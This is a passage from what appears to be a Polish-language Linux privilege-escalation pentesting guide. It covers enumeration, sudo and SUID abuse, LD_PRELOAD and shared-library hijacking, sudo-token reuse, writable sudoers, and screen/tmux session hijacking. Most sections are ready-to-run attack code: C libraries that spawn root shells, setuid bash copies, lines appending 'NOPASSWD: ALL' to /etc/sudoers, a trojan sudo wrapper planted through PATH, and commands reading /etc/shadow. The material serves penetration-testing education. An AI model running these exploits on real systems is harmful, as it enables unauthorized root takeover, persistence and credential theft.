Zauważ, że jeśli masz uprawnienia zapisu do gniazda docker, ponieważ jesteś **w grupie `docker`**, masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z docker lub nadużycie go do privilege escalation** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli stwierdzisz, że możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli stwierdzisz, że możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system **komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom efektywną wymianę danych i współdziałanie. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, wspierając podstawową IPC, która usprawnia wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto wspomaga rozgłaszanie zdarzeń lub sygnałów, ułatwiając płynną integrację komponentów systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, upraszczając dotychczas skomplikowane procesy.

D-Bus działa w modelu **allow/deny**, zarządzając uprawnieniami do wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie skumulowanego efektu pasujących reguł polityki. Te polityki określają interakcje z bussem, co potencjalnie może pozwolić na privilege escalation poprzez wykorzystanie tych uprawnień.

Podano przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf`, opisujący uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy stosują się uniwersalnie, podczas gdy polityki z kontekstem "default" dotyczą wszystkich, którzy nie są objęci innymi, specyficznymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerate i exploit komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieć i ustalić pozycję maszyny.

### Ogólne enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Zawsze sprawdź usługi sieciowe działające na maszynie, z którymi nie mogłeś się komunikować przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz być w stanie przechwycić niektóre credentials.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** są w systemie, którzy mogą się **zalogować** i którzy mają **uprawnienia roota**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linuksa były dotknięte błędem, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać ci uprawnienia root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane passwords

Jeśli **znasz jakikolwiek password** środowiska, **spróbuj zalogować się jako każdy użytkownik** używając tego samego password.

### Su Brute

Jeśli nie przeszkadza ci generowanie dużego hałasu i binaria `su` i `timeout` są obecne na komputerze, możesz spróbować brute-force'ować użytkownika używając [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` także próbuje brute-force'ować użytkowników.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać w jakimś folderze należącym do $PATH**, możesz być w stanie eskalować uprawnienia przez **utworzenie backdoora w zapisywalnym folderze** o nazwie jakiegoś polecenia, które zostanie wykonane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z folderu znajdującego się wcześniej** niż twój zapisywalny folder w $PATH.

### SUDO and SUID

Możesz mieć możliwość wykonania pewnych poleceń przy użyciu sudo lub pliki mogą mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików lub nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja sudo może pozwolić użytkownikowi na uruchomienie pewnego polecenia z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`; teraz trywialnie można uzyskać powłokę, dodając klucz ssh do katalogu `root` lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **set an environment variable** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało na załadowanie dowolnej biblioteki python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowany przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie Bash przy starcie nieinteraktywnych shelli, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Dlaczego to działa: Dla nieinteraktywnych shelli Bash ocenia `$BASH_ENV` i wczytuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala uruchamiać skrypt lub wrapper shell. Jeśli `BASH_ENV` jest zachowany przez sudo, twój plik zostanie wczytany z uprawnieniami roota.

- Wymagania:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Wzmacnianie zabezpieczeń:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, lepiej użyj `env_reset`.
- Unikaj wrapperów shell dla sudo-allowed commands; używaj minimalnych binaries.
- Rozważ sudo I/O logging i alertowanie, gdy zachowane zmienne środowiskowe są używane.

### Obchodzenie ścieżek wykonania sudo

**Przejdź** aby przeczytać inne pliki lub użyj **dowiązań symbolicznych**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty jest **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez ścieżki do polecenia

Jeśli **sudo permission** jest przyznane dla pojedynczego polecenia **bez podania ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli **suid** binary **uruchamia inne polecenie bez podania do niego ścieżki (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnego SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary z określoną ścieżką polecenia

Jeśli **suid** binary **uruchamia inne polecenie określając ścieżkę**, możesz spróbować **export a function** nazwaną tak, jak polecenie, które wywołuje plik suid.

Na przykład, jeśli suid binary wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy uruchomisz binarkę suid, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do określenia jednej lub więcej bibliotek współdzielonych (.so), które loader załaduje przed wszystkimi innymi, włącznie ze standardową biblioteką C (`libc.so`). Ten proces nazywa się wstępnym ładowaniem biblioteki.

Jednak aby zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych plików **suid/sgid**, system wymusza pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla wykonywalnych plików, w których realny identyfikator użytkownika (_ruid_) nie zgadza się z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z suid/sgid, tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają suid/sgid, są wstępnie ładowane.

Escalacja uprawnień może nastąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo`, a wynik `sudo -l` zawiera zapis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala, aby zmienna środowiskowa **LD_PRELOAD** przetrwała i była rozpoznawana nawet podczas uruchamiania poleceń przez `sudo`, co potencjalnie może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje **LD_LIBRARY_PATH** env variable, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy natrafisz na binary z uprawnieniami **SUID**, które wydają się nietypowe, warto sprawdzić, czy poprawnie ładuje pliki **.so**. Można to zweryfikować, wykonując następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, natrafienie na błąd takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ wskazuje na możliwość wykorzystania.

Aby to wykorzystać, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulację uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku obiektowego współdzielonego (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
W końcu uruchomienie dotkniętego binarnego pliku SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Skoro znaleźliśmy binarkę SUID, która ładuje bibliotekę z katalogu, do którego możemy zapisywać, stwórzmy bibliotekę w tym katalogu pod odpowiednią nazwą:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znaczy, że biblioteka, którą wygenerowałeś, musi mieć funkcję nazwaną `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skatalogowana lista Unixowych binarek, które mogą zostać wykorzystane przez atakującego do ominięcia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to to samo, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binarek Unix, które można nadużyć, aby wydostać się z ograniczonych shelli, eskalować lub utrzymać podwyższone uprawnienia, transferować pliki, uruchamiać bind i reverse shelle oraz ułatwiać inne zadania post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli możesz uruchomić `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie którejkolwiek reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **dostęp do sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **oczekując na wykonanie polecenia sudo, a następnie przejmując token sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" **użył `sudo`** do wykonania czegoś w ciągu **ostatnich 15 minut** (domyślnie to czas trwania tokena sudo, który pozwala używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępny (możesz go wgrać)

(Możesz tymczasowo ustawić `ptrace_scope` na 0 za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Drugi exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do root z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Ten **trzeci exploit** (`exploit_v3.sh`) będzie **tworzyć sudoers file**, który sprawi, że **sudo tokens będą bezterminowe i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **write permissions** w folderze lub na którymkolwiek z plików utworzonych wewnątrz folderu, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **create a sudo token for a user and PID**.\\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten user z PID 1234, możesz **obtain sudo privileges** bez potrzeby znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` konfigurują, kto może korzystać z `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać kilka interesujących informacji**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla binarki `sudo`, takie jak `doas` na OpenBSD — pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **user usually connects to a machine and uses `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **create a new sudo executable** który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **modify the $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash_profile), aby gdy użytkownik wykona sudo, został uruchomiony twój sudo executable.

Zwróć uwagę, że jeśli użytkownik używa innego shell (nie bash) będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

To oznacza, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie wyszukiwał biblioteki w `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którymkolwiek z wskazanych miejsc: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, w dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub w dowolnym folderze wskazanym przez plik konfiguracyjny w `/etc/ld.so.conf.d/*.conf`, może być w stanie uzyskać podwyższone uprawnienia.\
Zobacz, **jak wykorzystać tę nieprawidłową konfigurację**, na następującej stronie:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując lib do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, zgodnie z wartością zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają **podzbiór dostępnych uprawnień root dla procesu**. W praktyce dzieli to uprawnienia root na **mniejsze i odrębne jednostki**. Każdej z tych jednostek można następnie niezależnie przydzielać procesom. W ten sposób zmniejsza się pełen zestaw uprawnień, ograniczając ryzyko eskalacji.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je wykorzystać**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu **bit dla "execute"** oznacza, że dotknięty użytkownik może **"cd"** do folderu.\
Bit **"read"** oznacza, że użytkownik może **wypisać** **pliki**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) stanowią drugą warstwę uprawnień dyskrecjonarnych, zdolną do **nadpisywania tradycyjnych ugo/rwx permissions**. Te uprawnienia zwiększają kontrolę dostępu do plików lub katalogów, pozwalając na przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **granularności zapewnia precyzyjniejsze zarządzanie dostępem**. Szczegóły można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte sesje shell

W **starych wersjach** możesz **hijack** niektóre sesje **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **connect** do sesji screen tylko **własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje w sesji**.

### screen sessions hijacking

**Wypisz sesje screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem ze **starymi wersjami tmux**.  
Nie udało mi się przeprowadzić hijack na sesji tmux (v2.1) utworzonej przez root, będąc użytkownikiem bez uprawnień.

**Wypisz sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itd.) pomiędzy wrześniem 2006 a 13 maja 2008 mogą być podatne na ten błąd.\
Ten błąd występuje podczas tworzenia nowego klucza ssh w tych systemach, ponieważ **istniało tylko 32,768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh możesz wyszukać odpowiadający mu klucz prywatny**. Obliczone możliwości znajdziesz tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie kluczem publicznym jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustymi hasłami. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się przez ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może logować się przy użyciu hasła i klucza prywatnego
- `without-password` lub `prohibit-password`: root może się logować tylko za pomocą klucza prywatnego
- `forced-commands-only`: root może się zalogować tylko używając klucza prywatnego i jeśli opcje commands są określone
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki bezwzględne** (zaczynające się od `/`) lub **ścieżki względne względem home użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się za pomocą **private** key użytkownika "**testusername**", ssh porówna public key twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala Ci **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Dzięki temu będziesz mógł **jump** via ssh **to a host** i stamtąd **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` ma wartość `*`, za każdym razem gdy użytkownik przeskoczy na inną maszynę, ta maszyna będzie mogła uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwolić** lub **zabronić** ssh-agent forwarding przy użyciu słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

Jeśli stwierdzisz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać to do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są uruchamiane, gdy użytkownik uruchamia nową powłokę**. W związku z tym, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakikolwiek podejrzany skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

